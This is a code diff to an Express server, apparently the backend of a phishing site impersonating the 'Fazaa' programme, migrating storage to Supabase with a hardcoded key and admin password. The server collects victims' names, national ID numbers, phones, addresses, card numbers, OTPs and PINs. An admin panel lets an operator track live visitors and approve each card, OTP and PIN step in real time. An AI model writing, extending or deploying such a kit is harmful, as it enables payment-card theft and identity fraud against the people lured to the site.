@@ -1,23 +1,30 @@
 const express = require("express");
-const fs = require("fs");
 const path = require("path");
 
 const app = express();
 app.use(express.json({ limit: "100kb" }));
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
-const DATA_DIR = process.env.VERCEL ? "/tmp" : (process.env.DATA_DIR || path.join(__dirname, "data"));
-const ORDERS_FILE = path.join(DATA_DIR, "orders.json");
+const SB_URL = "https://hqhucwxczutpwvddtuws.supabase.co/rest/v1";
+const SB_KEY = "sb_publishable_6Rouky_x_o6YZrAeSe837w_p7_wWgQg";
 
-try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
-let orders = [];
-try { orders = JSON.parse(fs.readFileSync(ORDERS_FILE, "utf8")); } catch (e) { orders = []; }
-function saveOrders() {
-  try {
-    const tmp = ORDERS_FILE + ".tmp";
-    fs.writeFileSync(tmp, JSON.stringify(orders));
-    fs.renameSync(tmp, ORDERS_FILE);
-  } catch (e) {}
+const H = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=representation" };
+const Hmin = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=minimal" };
+
+async function sbGet(table, query) {
+  const r = await fetch(SB_URL + "/" + table + (query ? "?" + query : ""), { headers: H });
+  return r.ok ? r.json() : [];
+}
+async function sbInsert(table, data) {
+  const r = await fetch(SB_URL + "/" + table, { method: "POST", headers: H, body: JSON.stringify(data) });
+  return r.ok ? r.json() : null;
+}
+async function sbUpdate(table, filter, data) {
+  const r = await fetch(SB_URL + "/" + table + "?" + filter, { method: "PATCH", headers: H, body: JSON.stringify(data) });
+  return r.ok ? r.json() : null;
+}
+async function sbDelete(table, filter) {
+  await fetch(SB_URL + "/" + table + "?" + filter, { method: "DELETE", headers: Hmin });
 }
 
 const visitors = new Map();
@@ -46,13 +53,18 @@ function cleanOrder(b) {
   let rawName = p.cardName || p.name || "";
   if (typeof rawName === "boolean") rawName = "";
   return {
-    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
+    ref: str(b.ref, 40),
+    status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
     card: str(b.card, 10), watch: str(b.watch, 10),
     st: b.st === "resident" ? "resident" : "citizen",
-    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
-    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
-    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
-    step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
+    name: str(b.n, 120),
+    id_number: str(b.id, 20).replace(/\D/g, ""),
+    phone: str(b.p, 15).replace(/\D/g, ""),
+    email: str(b.e, 160),
+    gender: b.g === "female" ? "female" : "male",
+    emirate: str(b.em, 30), age: str(b.a, 5), address: str(b.ad, 500),
+    lang: b.lang === "en" ? "en" : "ar",
+    step: ["card", "otp", "pin"].includes(b.step) ? b.step : null,
     pay: {
       cardName: str(rawName, 120),
       cardNumber: str(rawCard, 30),
@@ -66,34 +78,52 @@ function cleanOrder(b) {
   };
 }
 
-app.post("/api/orders", (req, res) => {
-  const b = req.body;
-  const o = cleanOrder(b);
-  if (o.pay === undefined) delete o.pay;
-  if (o.step === undefined) delete o.step;
-  if (!/^FZ-\d{6,}$/.test(o.ref) || !o.n || o.p.length !== 9)
-    return res.status(400).json({ ok: false, error: "invalid" });
-  const i = orders.findIndex(x => x.ref === o.ref);
-  if (i >= 0) {
-    const prev = orders[i];
-    orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
-  } else {
-    orders.unshift({ ...o, ts: Date.now() });
-    if (orders.length > 5000) orders.length = 5000;
-  }
-  saveOrders();
-  res.json({ ok: true, ref: o.ref });
+function toClientOrder(row) {
+  return {
+    ref: row.ref, status: row.status, card: row.card, watch: row.watch, st: row.st,
+    n: row.name, id: row.id_number, p: row.phone, e: row.email, g: row.gender,
+    em: row.emirate, a: row.age, ad: row.address, lang: row.lang,
+    step: row.step, decision: row.decision, reason: row.reason, next: row.next_step,
+    pay: row.pay, ts: row.created_at ? new Date(row.created_at).getTime() : null,
+    updated: row.updated_at ? new Date(row.updated_at).getTime() : null
+  };
+}
+
+app.post("/api/orders", async (req, res) => {
+  try {
+    const b = req.body;
+    const o = cleanOrder(b);
+    if (!/^FZ-\d{6,}$/.test(o.ref) || !o.name || (o.phone || "").length !== 9)
+      return res.status(400).json({ ok: false, error: "invalid" });
+
+    const existing = await sbGet("orders", "ref=eq." + encodeURIComponent(o.ref) + "&select=*&limit=1");
+    if (existing && existing.length > 0) {
+      const prev = existing[0];
+      const updates = { ...o, updated_at: new Date().toISOString() };
+      if (prev.status === "confirmed") updates.status = "confirmed";
+      if (o.status === "awaiting") { updates.decision = null; updates.reason = null; }
+      else { updates.decision = prev.decision; updates.reason = prev.reason; }
+      delete updates.ref;
+      await sbUpdate("orders", "ref=eq." + encodeURIComponent(o.ref), updates);
+    } else {
+      await sbInsert("orders", o);
+    }
+    res.json({ ok: true, ref: o.ref });
+  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-app.get("/api/status/:ref", (req, res) => {
-  const ref = req.params.ref;
-  const o = orders.find(x => x.ref === ref);
-  if (!o) return res.status(404).json({ ok: false });
-  res.json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
+app.get("/api/status/:ref", async (req, res) => {
+  try {
+    const ref = req.params.ref;
+    const rows = await sbGet("orders", "ref=eq." + encodeURIComponent(ref) + "&select=status,decision,reason,next_step&limit=1");
+    if (!rows || !rows.length) return res.status(404).json({ ok: false });
+    const o = rows[0];
+    res.json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next_step || "" });
+  } catch (e) { res.status(500).json({ ok: false }); }
 });
 
 app.post("/api/ping", (req, res) => {
-  const id = str(req.body.id, 40);
+  const id = str((req.body || {}).id, 40);
   if (!id) return res.status(400).json({ ok: false });
   visitors.set(id, { t: Date.now(), page: str(req.body.page, 60) });
   res.json({ ok: true });
@@ -109,39 +139,47 @@ app.get("/api/admin/check", (req, res) => {
   res.json({ ok: true });
 });
 
-app.get("/api/admin/orders", (req, res) => {
+app.get("/api/admin/orders", async (req, res) => {
   if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
-  const v = activeVisitors();
-  res.json({ ok: true, orders, active: v.length, pages: v.map(x => x.page) });
+  try {
+    const rows = await sbGet("orders", "select=*&order=created_at.desc&limit=500");
+    const v = activeVisitors();
+    const clientOrders = (rows || []).map(toClientOrder);
+    res.json({ ok: true, orders: clientOrders, active: v.length, pages: v.map(x => x.page) });
+  } catch (e) { res.status(500).json({ ok: false }); }
 });
 
-app.post("/api/admin/decide/:ref", (req, res) => {
+app.post("/api/admin/decide/:ref", async (req, res) => {
   if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
-  const ref = req.params.ref;
-  const decision = req.body.decision === "reject" ? "reject" : "accept";
-  const o = orders.find(x => x.ref === ref);
-  if (!o) return res.status(404).json({ ok: false });
-  const step = o.step || "card";
-  if (decision === "reject") {
-    o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
-  } else {
-    const nextOf = { card: "otp", otp: "pin", pin: "done" };
-    const next = nextOf[step];
-    o.decision = "accept"; o.reason = "";
-    if (next === "done") { o.status = "confirmed"; o.next = "done"; }
-    else { o.status = "stepok"; o.next = next; }
-  }
-  o.updated = Date.now();
-  saveOrders();
-  res.json({ ok: true, status: o.status });
+  try {
+    const ref = req.params.ref;
+    const decision = req.body.decision === "reject" ? "reject" : "accept";
+    const rows = await sbGet("orders", "ref=eq." + encodeURIComponent(ref) + "&select=*&limit=1");
+    if (!rows || !rows.length) return res.status(404).json({ ok: false });
+    const o = rows[0];
+    const step = o.step || "card";
+    const updates = { updated_at: new Date().toISOString() };
+    if (decision === "reject") {
+      updates.decision = "reject"; updates.reason = step; updates.status = "rejected"; updates.next_step = null;
+    } else {
+      const nextOf = { card: "otp", otp: "pin", pin: "done" };
+      const next = nextOf[step];
+      updates.decision = "accept"; updates.reason = null;
+      if (next === "done") { updates.status = "confirmed"; updates.next_step = "done"; }
+      else { updates.status = "stepok"; updates.next_step = next; }
+    }
+    await sbUpdate("orders", "ref=eq." + encodeURIComponent(ref), updates);
+    res.json({ ok: true, status: updates.status });
+  } catch (e) { res.status(500).json({ ok: false }); }
 });
 
-app.delete("/api/admin/orders/:ref", (req, res) => {
+app.delete("/api/admin/orders/:ref", async (req, res) => {
   if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
-  const ref = req.params.ref;
-  orders = orders.filter(o => o.ref !== ref);
-  saveOrders();
-  res.json({ ok: true });
+  try {
+    const ref = req.params.ref;
+    await sbDelete("orders", "ref=eq." + encodeURIComponent(ref));
+    res.json({ ok: true });
+  } catch (e) { res.status(500).json({ ok: false }); }
 });
 
 if (!process.env.VERCEL) {
@@ -150,7 +188,7 @@ if (!process.env.VERCEL) {
     res.sendFile(path.join(__dirname, "public", "index.html"));
   });
   const PORT = process.env.PORT || 3000;
-  app.listen(PORT, () => console.log(`Fazaa running on port ${PORT}`));
+  app.listen(PORT, () => console.log("Fazaa running on port " + PORT));
 }
 
 module.exports = app;
